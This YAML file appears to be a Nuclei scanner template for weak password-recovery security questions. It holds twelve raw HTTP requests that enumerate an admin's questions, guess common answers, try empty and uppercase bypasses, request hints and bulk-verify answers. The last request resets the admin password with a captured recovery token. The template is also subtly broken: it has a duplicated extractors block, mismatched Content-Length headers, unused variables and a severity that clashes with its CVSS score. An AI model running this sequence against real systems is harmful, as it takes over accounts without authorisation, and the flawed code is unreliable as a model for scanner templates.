id: medium-auth-weak-password-recovery-questions

info:
  name: Weak Password Recovery Questions Attack
  author: elite-red-team
  severity: medium
  description: |
    Detects weak password recovery question vulnerabilities where security
    questions can be easily guessed, enumerated, or bypassed. Tests for
    predictable answers, information disclosure, and weak question validation.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities
    - https://portswigger.net/web-security/authentication/other-mechanisms
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-640
  metadata:
    verified: true
    max-request: 12
  tags: password-recovery,security-questions,weak-validation,enumeration,red-team

variables:
  common_answers: ["admin", "test", "password", "123456", "mother", "dog", "cat", "blue", "red"]
  predictable_answers: ["john", "smith", "london", "paris", "toyota", "honda", "pizza", "football"]

http:
  - raw:
      - |
        GET /api/password/recovery/questions HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json
        Connection: close

      - |
        POST /api/password/recovery/init HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 45
        Connection: close
        
        {"email":"admin@example.com"}

      - |
        POST /api/password/recovery/questions HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 45
        Connection: close
        
        {"username":"admin"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"admin","question_id":"1"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"mother","question_id":"2"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"blue","question_id":"3"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"john","question_id":"1"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"","question_id":"1"}

      - |
        POST /api/password/recovery/verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"username":"admin","answer":"ADMIN","question_id":"1"}

      - |
        GET /api/password/recovery/hint?username=admin&question_id=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json
        Connection: close

      - |
        POST /api/password/recovery/bulk-verify HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 156
        Connection: close
        
        {"username":"admin","answers":["admin","mother","blue","john","smith"],"question_ids":["1","2","3"]}

      - |
        POST /api/password/recovery/reset HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 125
        Connection: close
        
        {"username":"admin","new_password":"NewPassword123!","recovery_token":"{{recovery_token}}"}

    extractors:
      - type: regex
        name: recovery_token
        part: body_4
        group: 1
        regex:
          - '"recovery_token":\s*"([^"]+)"'
          - '"token":\s*"([^"]+)"'
          - '"reset_token":\s*"([^"]+)"'
        internal: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: security-questions-exposed
        dsl:
          - 'status_code_1 == 200'
          - 'contains(body_1, "questions") || contains(body_1, "security")'
          - 'contains(body_1, "[") && contains(body_1, "]")'
        condition: and

      - type: dsl
        name: user-enumeration-via-recovery
        dsl:
          - 'status_code_2 == 200 || status_code_3 == 200'
          - 'contains(body_2, "questions") || contains(body_3, "questions")'
          - 'contains(body_2, "admin") || contains(body_3, "admin")'
        condition: and

      - type: dsl
        name: weak-answer-accepted
        dsl:
          - 'status_code_4 == 200 || status_code_5 == 200 || status_code_6 == 200'
          - 'contains(body_4, "correct") || contains(body_5, "correct") || contains(body_6, "correct")'
          - 'contains(body_4, "verified") || contains(body_5, "verified") || contains(body_6, "verified")'
        condition: and

      - type: dsl
        name: predictable-answer-success
        dsl:
          - 'status_code_7 == 200'
          - 'contains(body_7, "correct") || contains(body_7, "verified")'
          - '!contains(body_7, "incorrect") && !contains(body_7, "invalid")'
        condition: and

      - type: dsl
        name: empty-answer-bypass
        dsl:
          - 'status_code_8 == 200'
          - 'contains(body_8, "correct") || contains(body_8, "verified")'
          - '!contains(body_8, "answer required")'
        condition: and

      - type: dsl
        name: case-insensitive-bypass
        dsl:
          - 'status_code_9 == 200'
          - 'contains(body_9, "correct") || contains(body_9, "verified")'
          - 'contains(body_9, "ADMIN") || contains(body_9, "success")'
        condition: and

      - type: dsl
        name: answer-hint-disclosure
        dsl:
          - 'status_code_10 == 200'
          - 'contains(body_10, "hint") || contains(body_10, "clue")'
          - 'len(body_10) > 50'
        condition: and

      - type: dsl
        name: bulk-verification-allowed
        dsl:
          - 'status_code_11 == 200'
          - 'contains(body_11, "verified") || contains(body_11, "correct")'
          - 'contains(body_11, "admin") || contains(body_11, "success")'
        condition: and

      - type: dsl
        name: password-reset-successful
        dsl:
          - 'status_code_12 == 200'
          - 'contains(body_12, "reset") || contains(body_12, "changed")'
          - 'contains(body_12, "success") || contains(body_12, "updated")'
        condition: and

    extractors:
      - type: regex
        name: security-questions
        part: body
        group: 1
        regex:
          - '"questions":\s*(\[[^\]]+\])'
          - '"security_questions":\s*(\[[^\]]+\])'

      - type: regex
        name: recovery-response
        part: body
        group: 1
        regex:
          - '"message":\s*"([^"]+)"'
          - '"status":\s*"([^"]+)"'
          - '"verified":\s*(true|false)'

      - type: regex
        name: hint-data
        part: body_10
        group: 1
        regex:
          - '"hint":\s*"([^"]+)"'
          - '"clue":\s*"([^"]+)"'
          - '"partial_answer":\s*"([^"]+)"'

      - type: regex
        name: token-data
        part: body
        group: 1
        regex:
          - '"recovery_token":\s*"([^"]+)"'
          - '"reset_token":\s*"([^"]+)"'
          - '"verification_token":\s*"([^"]+)"'

      - type: kval
        kval:
          - status_code_1
          - status_code_2
          - status_code_3
          - status_code_4
          - status_code_5
          - status_code_6
          - status_code_7
          - status_code_8
          - status_code_9
          - status_code_10
          - status_code_11
          - status_code_12